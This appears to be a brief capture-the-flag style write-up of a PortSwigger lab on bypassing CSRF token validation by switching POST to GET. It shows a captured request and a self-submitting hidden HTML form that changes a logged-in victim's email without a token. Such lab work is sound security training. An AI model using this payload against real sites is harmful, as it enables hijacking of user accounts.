# [CSRF: Token Validation Depends on Request Method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

This is a valid POST request initiated by a logged-in user:

```http
POST /my-account/change-email HTTP/2
Host: 0a650063048614538281bf5700590043.web-security-academy.net
Cookie: session=Fr0dAU3G4s5ixvxQ8mn1Uvl67F21hjAD
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a650063048614538281bf5700590043.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: https://0a650063048614538281bf5700590043.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=a%40a.a&csrf=hN3CPjmJwe9hZzbKBltxaO33SUqAWpZf
```

The target validates the CSRF token when the request is via POST, but not for GET requests.

This exploit changes the request type (via `method=`) and omits the CSRF token entirely:

```html
<form action="https://0a650063048614538281bf5700590043.web-security-academy.net/my-account/change-email" method="GET">
  <input type="hidden" name="email" value="x@x.x" />
  <input type="submit" value="Submit request" />
</form>
<script>
  history.pushState('', '', '/');
  document.forms[0].submit();
</script>
```